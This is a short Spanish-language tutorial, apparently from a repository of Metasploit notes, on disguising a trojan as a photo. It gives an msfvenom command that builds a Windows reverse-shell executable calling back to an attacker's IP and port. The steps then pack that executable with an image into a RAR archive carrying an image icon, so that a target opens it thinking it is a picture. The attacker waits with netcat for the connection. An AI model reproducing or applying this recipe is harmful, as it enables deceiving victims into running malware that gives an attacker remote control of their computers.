# Creamos el payload (virus) en linux preferentemente
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o virus.exe
```

--------------------------------------

# Nos lo pasamos a windows para seguir trabajando ahi y lo guardamos en una carpeta junto con una imagen

---------------------------------------------

# Con esa imagen que queramos la transformamos a formato .ico 
# Hay paginas gratis en internet para hacer eso aca dejo una sino busca otra
 [Convertidor Imagen](https://imagen.online-convert.com/es/convertir-a-ico)

---------------------------

# Convertimos a rar seleccionando juntos el virus y la foto y (marcamos las siguientes casillas)

![Captura de pantalla 2023-07-04 163709](https://github.com/sav404/Metasploit-notes/assets/169759579/82d3c07a-0f98-480e-8837-00edeced4854)

-------------------------------------

# En la pestaña texto e iconos y examinamos en cargar icono desde fichero y elegimos la foto en formato .ico

![config](https://github.com/sav404/Metasploit-notes/assets/169759579/45910970-34fa-414c-a45a-0159ae673754)



# Se nos va a crear un archivo como este

![Captura de pantalla 2023-07-04 165159](https://github.com/sav404/Metasploit-notes/assets/169759579/0066de22-276e-469b-ba12-a32289eaa0a1)


# Nos ponemos en escucha con netcat en el puerto para recibir la señal en el momento que el objetivo abra la foto y obtendremos acceso total a su maquina. 

----
